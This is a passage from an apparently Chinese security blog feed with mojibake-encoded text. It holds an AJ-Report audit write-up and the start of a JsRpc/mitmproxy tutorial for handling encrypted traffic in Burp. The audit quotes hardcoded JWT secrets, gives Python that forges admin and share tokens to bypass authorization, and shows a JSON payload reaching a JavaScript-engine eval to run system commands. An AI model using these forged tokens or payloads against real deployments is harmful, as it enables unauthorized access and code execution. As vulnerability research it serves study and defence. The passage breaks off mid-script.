username).withClaim(<span class="string">&quot;uuid&quot;</span>, uuid).withClaim(<span class="string">&quot;type&quot;</span>, type).withClaim(<span class="string">&quot;tenant&quot;</span>, tenantCode).sign(Algorithm.HMAC256(<span class="built_in">this</span>.gaeaProperties.getSecurity().getJwtSecret()));</span><br><span class="line">    <span class="keyword">return</span> token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè·Ÿè¿›<code>getJwtSecret</code> æ–¹æ³•æ‰¾åˆ°jwtçš„ç¡¬ç¼–ç ä¸º<code>anji_plus_gaea_p@ss1234</code> ï¼Œæ ¹æ®é€»è¾‘ç”Ÿæˆä¸€ä¸‹token</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">getFakeToken</span><span class="params">()</span>:</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;uuid&quot;</span>: <span class="string">&quot;627750b8be86421d94facec7e4dba555&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tenant&quot;</span>: <span class="string">&quot;tenantCode&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    fakeToken = jwt.encode(payload,<span class="string">&#x27;anji_plus_gaea_p@ss1234&#x27;</span>,algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    print(fakeToken)</span><br><span class="line">    <span class="keyword">return</span> fakeToken</span><br></pre></td></tr></table></figure><p>åé¢å‘ç°å…‰æœ‰è¿™ä¸ªæ²¡å•¥ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">shareToken</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Share-Token&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StringUtils.isBlank(token) &amp;&amp; StringUtils.isBlank(shareToken)) &#123;</span><br><span class="line">    error(response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ£€æµ‹Share-Tokenï¼Œæ²¡è®¾ç½®è¿™ä¸ªçš„è¯åœ¨è¿™é‡Œå°±æŠ›å¼‚å¸¸äº†ï¼Œè¿™ä¸ªçš„ç”Ÿæˆé€»è¾‘åœ¨JwtUtil.javaä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_SECRET</span> <span class="operator">=</span> <span class="string">&quot;aj-report&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createToken</span><span class="params">(String reportCode, String shareCode, Date expires)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createToken(reportCode, shareCode, <span class="literal">null</span>, expires);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createToken</span><span class="params">(String reportCode, String shareCode, String password, Date expires)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JWT.create()</span><br><span class="line">                .withIssuedAt(<span class="keyword">new</span> <span class="title class_">Date</span>())</span><br><span class="line">                .withExpiresAt(expires)</span><br><span class="line">                .withClaim(<span class="string">&quot;reportCode&quot;</span>, reportCode)</span><br><span class="line">                .withClaim(<span class="string">&quot;shareCode&quot;</span>, shareCode)</span><br><span class="line">                .withClaim(<span class="string">&quot;sharePassword&quot;</span>, password)</span><br><span class="line">                .sign(Algorithm.HMAC256(JWT_SECRET));</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„æ˜¯ç¡¬ç¼–ç ï¼Œè¿™é‡Œçš„reportCodeå³å¯¹åº”ä¸‹é¢çš„åˆ¤æ–­é€»è¾‘ï¼Œä½ è¦è®¿é—®çš„æ¥å£ä¸­æœ‰ä½ ä¼ å…¥çš„reportCodeå³å¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153435978.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">getFakeShareToken</span><span class="params">()</span>:</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;shareCode&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;reportCode&quot;</span>: <span class="string">&quot;/dataSetParam&quot;</span>, #é€šç”¨æ€§</span><br><span class="line">        <span class="string">&quot;exp&quot;</span>: <span class="number">1742358830</span>,</span><br><span class="line">        <span class="string">&quot;sharePassword&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    fakeShareToken = jwt.encode(payload,<span class="string">&#x27;aj-report&#x27;</span>,algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    print(fakeShareToken)</span><br><span class="line">    <span class="keyword">return</span> fakeShareToken</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ç»•è¿‡æƒé™æ ¡éªŒï¼Œå½“ç„¶ä¸ºäº†é€šç”¨æ€§ï¼ŒreportCodeå¯ç›´æ¥è®¾ä¸º<code>/</code>å³å¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153442380.png" alt="image.png"></p><h2 id="RCEåˆ†æ"><a href="#RCEåˆ†æ" class="headerlink" title="RCEåˆ†æ"></a>RCEåˆ†æ</h2><p>æ¥å£ä½ç½®åœ¨<code>DataSetParamController.java</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/verification&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseBean <span class="title function_">verification</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> DataSetParamValidationParam param)</span> &#123;</span><br><span class="line">    <span class="type">DataSetParamDto</span> <span class="variable">dto</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSetParamDto</span>();</span><br><span class="line">    dto.setSampleItem(param.getSampleItem());</span><br><span class="line">    dto.setValidationRules(param.getValidationRules());</span><br><span class="line">    <span class="keyword">return</span> responseSuccessWithData(dataSetParamService.verification(dto));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>verification</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªé‡å†™ï¼Œä¸è¿‡æˆ‘ä»¬ä¼ å…¥çš„æ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥ä¼šèµ°ä¸‹é¢è¿™ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">verification</span><span class="params">(DataSetParamDto dataSetParamDto)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">validationRules</span> <span class="operator">=</span> dataSetParamDto.getValidationRules();</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(validationRules)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            engine.eval(validationRules);</span><br><span class="line">            <span class="keyword">if</span>(engine <span class="keyword">instanceof</span> Invocable)&#123;</span><br><span class="line">                <span class="type">Invocable</span> <span class="variable">invocable</span> <span class="operator">=</span> (Invocable) engine;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">exec</span> <span class="operator">=</span> invocable.invokeFunction(<span class="string">&quot;verification&quot;</span>, dataSetParamDto);</span><br><span class="line">                <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">                <span class="keyword">if</span> (exec <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">                    <span class="keyword">return</span> objectMapper.convertValue(exec, Boolean.class);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> objectMapper.convertValue(exec, String.class);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> BusinessExceptionBuilder.build(ResponseCode.EXECUTE_JS_ERROR, ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>validationRules</code> å‚æ•°ä¼šæµå…¥<code>engine.eval()</code> ä¸­ï¼Œ<code>engine</code> ä¸ºä¸€ä¸ªjså¼•æ“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ScriptEngine engine;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">    engine = manager.getEngineByName(<span class="string">&quot;JavaScript&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±å¾ˆæ˜æ˜¾çš„Javaè°ƒç”¨jså‘½ä»¤æ‰§è¡Œï¼Œå‚æ•°æ„é€ å‚è€ƒDataSetParamDtoç±»å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;ParamName&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;paramDesc&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;paramType&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;sampleItem&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;mandatory&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;requiredFlag&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;validationRules&quot;</span>: <span class="string">&quot;function verification(data)&#123;a = new java.lang.ProcessBuilder(\&quot;ls\&quot;, \&quot;/\&quot;).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=&#x27;&#x27;;while((line = r.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153450339.png" alt="image.png"></p><p>åç»­è¿™é‡Œçš„ä¿®å¤æ˜¯æŠŠä¸‰ä¸ªå¸¸ç”¨æ‰§è¡Œå‘½ä»¤çš„ç±»banäº†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250320153455312.png" alt="image.png"></p><p>é’ˆå¯¹ç»•è¿‡æš‚æ—¶å…ˆä¸çœ‹äº†ï¼Œå·®ç‚¹åˆéš¾äº§äº†ã€‚ã€‚ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/news/7139">https://xz.aliyun.com/news/7139</a></p><p><a href="https://xz.aliyun.com/news/13897">https://xz.aliyun.com/news/13897</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JsRpcåŸºæœ¬ä½¿ç”¨</title>
      <link href="/2025/03/JsRpc%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/03/JsRpc%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/news/17198">æ–‡ç«  - JsRpcè”åŠ¨burpå®ç°è‡ªåŠ¨åŠ è§£å¯†ï¼ˆè¯¦ç»†ç‰ˆï¼‰ - å…ˆçŸ¥ç¤¾åŒº</a></p></blockquote><p>ç»ƒæ‰‹åœ°å€ï¼š<a href="https://github.com/0ctDay/encrypt-decrypt-vuls">https://github.com/0ctDay/encrypt-decrypt-vuls</a></p><p>JsRpcï¼š<a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></p><h2 id="JsRpcåŸºæœ¬ä½¿ç”¨"><a href="#JsRpcåŸºæœ¬ä½¿ç”¨" class="headerlink" title="JsRpcåŸºæœ¬ä½¿ç”¨"></a>JsRpcåŸºæœ¬ä½¿ç”¨</h2><p>é¦–å…ˆè§‚å¯Ÿä¸€ä¸‹åŸå§‹çš„æ•°æ®åŒ…</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105516612.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°é™¤äº†è¯·æ±‚ä½“éœ€è¦è§£å¯†ï¼Œè¿˜æœ‰è¯·æ±‚å¤´ä¸­çš„<code>timestampã€requestIdã€sign</code> éœ€è¦å®æ—¶æ›´æ–°ï¼Œæ‰€ä»¥è¯·æ±‚åŒ…ä¸­æ€»å…±æœ‰å››ä¸ªåœ°æ–¹éœ€è¦å¤„ç†ï¼Œç”±äºæ˜¯ç›´æ¥åªç”¨JsRpcï¼Œé‚£ä¹ˆå°±åªéœ€è¦æ‰¾åˆ°å¯¹åº”çš„å¤„ç†ä½ç½®ç„¶åè°ƒç”¨å³å¯ï¼Œä¸éœ€è¦å¼„æ¸…æ¥šå…·ä½“çš„å¤„ç†é€»è¾‘</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105522466.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105528830.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯å›¾ä¸­çš„å‡ ä¸ªåœ°æ–¹å¤„ç†çš„ï¼Œå…·ä½“é€»è¾‘å°±ä¸åˆ†æäº†ï¼Œä¸»è¦æ˜¯å­¦ä¼šä½¿ç”¨jsrpc</p><p>é¦–å…ˆæŠŠè¿™å‡ ä¸ªå‡½æ•°å…ˆæå‡åˆ°å…¨å±€ï¼Œéœ€è¦å…ˆæ–­ç‚¹è®©å…¶åŠ è½½åˆ°ä½œç”¨åŸŸ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105532754.png" alt="image.png"></p><p>ç„¶ååœ¨æ§åˆ¶å°æ‰§è¡Œä¸‹é¢è¯­å¥æå‡è‡³å…¨å±€ä½œç”¨åŸŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.requestId=p</span><br><span class="line"><span class="comment">//requestId</span></span><br><span class="line">window.v1 = v</span><br><span class="line"><span class="comment">//å‡½æ•°v</span></span><br><span class="line">window.sign=a.a.MD5</span><br><span class="line"><span class="comment">//ç­¾åsign</span></span><br><span class="line">window.l=l</span><br><span class="line">window.d=d</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105538367.png" alt="image.png"></p><p>ç„¶åæ³¨å…¥jsrpcä¸­çš„jsæ–‡ä»¶<code>JsEnv_Dev.js</code> ï¼Œæ³¨æ„æ³¨jsçš„æ—¶å€™æ–­ç‚¹å°±å¾—åœæ­¢äº†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105542571.png" alt="image.png"></p><p>ç„¶åå¯åŠ¨jsrpcæœåŠ¡ç«¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105546624.png" alt="image.png"></p><p>å†å®¢æˆ·ç«¯è¿æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hlclient</span>(<span class="string">&quot;ws://127.0.0.1:12080/ws?group=zzz&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105553519.png" alt="image.png"></p><p>è¿æ¥æˆåŠŸåæœåŠ¡ç«¯ä¼šæç¤ºæ–°ä¸Šçº¿â€¦.ç„¶åå°±æ˜¯å°†å‡½æ•°æ³¨å†Œè¿›å»ï¼Œå³æˆ‘ä»¬è¦æ€ä¹ˆå¤„ç†å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">demo.regAction(<span class="string">&quot;encode&quot;</span>,function (resolve,param) &#123;</span><br><span class="line">    n=JSON.stringify(v1(param))</span><br><span class="line">    <span class="type">var</span> <span class="variable">request</span> <span class="operator">=</span> l(n)</span><br><span class="line">    <span class="type">var</span> <span class="variable">time</span> <span class="operator">=</span> Date.parse(<span class="keyword">new</span> <span class="title class_">Date</span>);</span><br><span class="line">    <span class="keyword">var</span> id=requestId()</span><br><span class="line">    <span class="type">var</span> <span class="variable">sg</span> <span class="operator">=</span> sign(n+id+time).toString()</span><br><span class="line">    <span class="keyword">var</span> data=&#123;<span class="string">&quot;time&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;sign&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;request&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">    data[<span class="string">&quot;time&quot;</span>]=time.toString()</span><br><span class="line">    data[<span class="string">&quot;id&quot;</span>]=id</span><br><span class="line">    data[<span class="string">&quot;sign&quot;</span>]=sg</span><br><span class="line">    data[<span class="string">&quot;request&quot;</span>] = request</span><br><span class="line">    <span class="title function_">resolve</span><span class="params">(data)</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯åŠ å¯†ï¼Œä¸‹é¢æ˜¯è§£å¯†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">demo.regAction(<span class="string">&quot;decode&quot;</span>, function (resolve,param) &#123;</span><br><span class="line">    <span class="comment">//è¿™æ ·æ·»åŠ äº†ä¸€ä¸ªparamå‚æ•°ï¼Œhttpæ¥å£å¸¦ä¸Šå®ƒï¼Œè¿™é‡Œå°±èƒ½è·å¾—</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">response</span> <span class="operator">=</span> d(param)</span><br><span class="line">    resolve(response);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105600238.png" alt="image.png"></p><p>æ­¤æ—¶å°±å¯ä»¥æµ‹è¯•ä¸€ä¸‹jsrpcå¤„ç†æ˜¯å¦èƒ½æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105605033.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:12080/go?group=zzz&amp;action=encode&amp;param=&#123;&quot;password&quot;:&quot;123123&quot;,&quot;username&quot;:&quot;asd&quot;,&quot;validCode&quot;:&quot;ycpa&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åŠ å¯†æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ï¼Œ<code>zzz</code>å°±æ˜¯åŠ å…¥çš„ç»„å’Œä½ ä¸€å¼€å§‹è¿æ¥çš„æ—¶å€™ç›¸åŒå³å¯ï¼Œ<code>action</code> å³ä½ æ³¨å†Œçš„åŠ å¯†å‡½æ•°ï¼Œ<code>param</code> å°±æ˜¯ä½ è¦å¤„ç†çš„å‚æ•°ï¼Œçœ‹çœ‹è§£å¯†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105609221.png" alt="image.png"></p><p>ä¹Ÿæ˜¯èƒ½å¤Ÿæ­£å¸¸å¤„ç†çš„</p><h2 id="JsRpcè”åŠ¨burp"><a href="#JsRpcè”åŠ¨burp" class="headerlink" title="JsRpcè”åŠ¨burp"></a>JsRpcè”åŠ¨burp</h2><p>è”åŠ¨burpéœ€è¦å€ŸåŠ©mitmproxyå†™è„šæœ¬ï¼Œæˆ–è€…å€ŸåŠ©å…¶å®ƒä¸€äº›burpæ’ä»¶ä¹Ÿè¡Œï¼Œè¿™é‡Œå°±ç”¨mitmproxyäº†ï¼Œè„šæœ¬å€ŸåŠ©gptå¼„å‡ ä¸‹å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">from mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"></span><br><span class="line">def <span class="title function_">get_rpc</span><span class="params">(param)</span>:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:12080/go&quot;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;encode&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: param.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = requests.get(url, params=params, timeout=<span class="number">5</span>)</span><br><span class="line">        # ctx.log.info(f<span class="string">&quot;RPC Response: &#123;result.text&#125;&quot;</span>)</span><br><span class="line">        # ç¬¬ä¸€æ¬¡è§£æ JSONï¼Œè·å–å¤–å±‚ç»“æ„</span><br><span class="line">        outer_data = result.json()</span><br><span class="line">        # ç¬¬äºŒæ¬¡è§£æ data å­—æ®µï¼ˆå­—ç¬¦ä¸² -&gt; å­—å…¸ï¼‰</span><br><span class="line">        inner_data = json.loads(outer_data[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> inner_data  # ç›´æ¥è¿”å›è§£æåçš„å†…å±‚æ•°æ®</span><br><span class="line">    except Exception as e:</span><br><span class="line">        ctx.log.error(f<span class="string">&quot;Error in get_rpc: &#123;str(e)&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">def <span class="title function_">get_responseRpc</span><span class="params">(param)</span>:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:12080/go&quot;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;decode&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: param.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = requests.get(url, params=params, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        outer_data = result.json()</span><br><span class="line">        # ç¬¬äºŒæ¬¡è§£æ data å­—æ®µï¼ˆå­—ç¬¦ä¸² -&gt; å­—å…¸ï¼‰</span><br><span class="line">        inner_data = json.loads(outer_data[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> inner_data  # ç›´æ¥è¿”å›è§£æåçš„å†…å±‚æ•°æ®</span><br><span class="line">    except Exception as e:</span><br><span class="line">        ctx.log.error(f<span class="string">&quot;Error in get_rpc: &#123;str(e)&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">def <span class="title function_">request</span><span class="params">(flow)</span>:</span><br><span class="line">    original_body = flow.request.content</span><br><span class="line">    ctx.log.info(f<span class="string">&quot;åŸå§‹è¯·æ±‚ä½“: &#123;original_body&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    result = get_rpc(original_body)</span><br><span class="line">    <span class="keyword">if</span> result is None:</span><br><span class="line">        ctx.log.error(<span class="string">&quot;RPC failed, skipping request modification&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        # ç›´æ¥ä½¿ç”¨å†…å±‚æ•°æ®</span><br><span class="line">        flow.request.headers[<span class="string">&#x27;timestamp&#x27;</span>] = result[<span 